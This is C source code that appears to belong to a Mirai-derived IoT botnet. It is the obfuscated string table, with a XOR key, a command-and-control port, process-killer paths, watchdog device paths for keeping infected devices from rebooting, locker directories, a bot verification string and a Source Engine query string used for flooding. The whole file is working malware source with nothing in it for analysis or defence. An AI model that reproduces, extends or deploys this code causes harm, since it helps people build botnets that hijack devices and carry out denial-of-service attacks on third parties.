#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "../headers/includes.h"
#include "../headers/table.h"
#include "../headers/util.h"

uint32_t table_key = 0xc34afd7a;
struct table_value table[TABLE_MAX_KEYS];

static void add_sec(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

void sec_init(void)
{
    add_sec(TABLE_CNC_PORT, "\x06\x55", 2); // 2139

    add_sec(TABLE_KILLER_PROC, "\x21\x7E\x7C\x61\x6D\x21\x0E", 7);                                                      // /proc/
    add_sec(TABLE_KILLER_EXE, "\x21\x6B\x76\x6B\x0E", 5);                                                               // /exe
    add_sec(TABLE_KILLER_CMD, "\x21\x6D\x63\x6A\x62\x67\x60\x6B\x0E", 9);                                               // /cmdline
    add_sec(TABLE_KILLER_FD, "\x21\x68\x6A\x0E", 4);                                                                    // /fd
    add_sec(TABLE_KILLER_MAPS, "\x21\x63\x6F\x7E\x7D\x0E", 6);                                                          // /maps
    add_sec(TABLE_KILLER_TCP, "\x21\x7E\x7C\x61\x6D\x21\x60\x6B\x7A\x21\x7A\x6D\x7E\x0E", 14);                          // /proc/net/tcp
    add_sec(TABLE_ATK_VSE, "\x46\x41\x7D\x67\x60\x71\x77\x32\x57\x7C\x75\x7B\x7C\x77\x32\x43\x67\x77\x60\x6B\x12", 21); // TSource Engine Query

    add_sec(TABLE_IOCTL_KEEPALIVE1, "\x21\x6A\x6B\x78\x21\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x0E", 14);                                        // /dev/watchdog
	add_sec(TABLE_IOCTL_KEEPALIVE2, "\x21\x6A\x6B\x78\x21\x63\x67\x7D\x6D\x21\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x0E", 19);                    // /dev/misc/watchdog
    add_sec(TABLE_IOCTL_KEEPALIVE3, "\x21\x6A\x6B\x78\x21\x48\x5A\x59\x4A\x5A\x3F\x3E\x3F\x51\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x0E", 23);    // /dev/FTWDT101_watchdog
    add_sec(TABLE_IOCTL_KEEPALIVE4, "\x21\x6A\x6B\x78\x21\x48\x5A\x59\x4A\x5A\x3F\x3E\x3F\x2E\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x0E", 23);    // /dev/FTWDT101\ watchdog
    add_sec(TABLE_IOCTL_KEEPALIVE5, "\x21\x6A\x6B\x78\x21\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x3E\x0E", 15);                                    // /dev/watchdog0
    add_sec(TABLE_IOCTL_KEEPALIVE6, "\x21\x6B\x7A\x6D\x21\x6A\x6B\x68\x6F\x7B\x62\x7A\x21\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x0E", 22);        // /etc/default/watchdog
    add_sec(TABLE_IOCTL_KEEPALIVE7, "\x21\x7D\x6C\x67\x60\x21\x79\x6F\x7A\x6D\x66\x6A\x61\x69\x0E", 15);                                    // /sbin/watchdog

    add_sec(LOCKER_PATH_1, "\x21\x7A\x63\x7E\x0E", 5);      // /tmp
    add_sec(LOCKER_PATH_2, "\x21\x78\x6F\x7C\x0E", 5);      // /var
    add_sec(LOCKER_PATH_3, "\x21\x63\x60\x7A\x0E", 5);      // /mnt
    add_sec(LOCKER_PATH_4, "\x21\x66\x61\x63\x6B\x0E", 6);  // /home
    add_sec(LOCKER_PATH_5, "\x21\x7C\x61\x61\x7A\x0E", 6);  // /root
    add_sec(LOCKER_PATH_6, "\x21\x6A\x6B\x78\x0E", 5);      // /dev

    add_sec(LOCKER_BLACKLIST_1, "\x21\x6A\x6B\x78\x21\x60\x7B\x62\x62\x0E", 10);                // /dev/null
    add_sec(LOCKER_BLACKLIST_2, "\x21\x6A\x6B\x78\x21\x6D\x61\x60\x7D\x61\x62\x6B\x0E", 13);    // /dev/console

    //add_sec(MAP_BUFFER_1, "\x55\x66\x6B\x6F\x7E\x53\x0E", 7);                   // [heap]
    //add_sec(MAP_BUFFER_2, "\x7C\x23\x23\x7E\x0E", 5);                           // r--p
    //add_sec(MAP_BUFFER_3, "\x7C\x79\x23\x7E\x0E", 5);                           // rw-p
    //add_sec(NUMA_BUFFER_1, "\x21\x60\x7B\x63\x6F\x51\x63\x6F\x7E\x7D\x0E", 11); // /numa_maps
    //add_sec(NUMA_BUFFER_2, "\x6A\x6B\x68\x6F\x7B\x62\x7A\x0E", 8);              // default
    add_sec(POS_BUFFER_1, "\x20\x7D\x61\x0E", 4);                               // .so

    add_sec(BOT_VERIFY_STRING, "\x39\x46\x6A\x4F\x48\x5A\x7B\x58\x68\x0E", 10);   // 7HdAFTuVf

    add_sec(KILLER_SOCKET_1, "\x21\x7B\x7D\x7C\x0E", 5);                                            // /usr
    add_sec(KILLER_SOCKET_2, "\x21\x6C\x67\x60\x0E", 5);                                            // /bin
    add_sec(KILLER_SOCKET_3, "\x21\x7D\x6C\x67\x60\x0E", 6);                                        // /sbin
    add_sec(KILLER_SOCKET_4, "\x21\x62\x67\x6C\x0E", 5);                                            // /lib
    add_sec(KILLER_SOCKET_5, "\x21\x7D\x60\x6F\x7E\x0E", 6);                                        // /snap
    add_sec(KILLER_SOCKET_6, "\x21\x7D\x77\x7D\x7A\x6B\x63\x0E", 8);                                // /system
    add_sec(KILLER_SOCKET_7, "\x21\x6B\x6A\x78\x7C\x0E", 6);                                        // /edvr
    add_sec(KILLER_SOCKET_8, "\x21\x6D\x61\x63\x7E\x7C\x6B\x7D\x7D\x21\x7B\x7D\x7C\x21\x0E", 15);   // /compress/usr/
    add_sec(KILLER_SOCKET_9, "\x21\x7D\x7A\x6F\x67\x60\x68\x61\x0E", 9);                            // /stainfo
    add_sec(KILLER_SOCKET_10, "\x21\x2E\x26\x6A\x6B\x62\x6B\x7A\x6B\x6A\x27\x0E", 12);              // / (deleted)
    add_sec(KILLER_SOCKET_11, "\x21\x7B\x7A\x67\x62\x0E", 6);                                       // /util
    add_sec(KILLER_SOCKET_12, "\x20\x6D\x69\x67\x0E", 5);                                           // .cgi
}

static void sec_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

void sec_toggle(uint8_t id)
{
    sec_obf(id);
}

char *sec_unwrap(int id, int *len)
{
    struct table_value *val = &table[id];

    if(val->locked)
    {
        //printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}
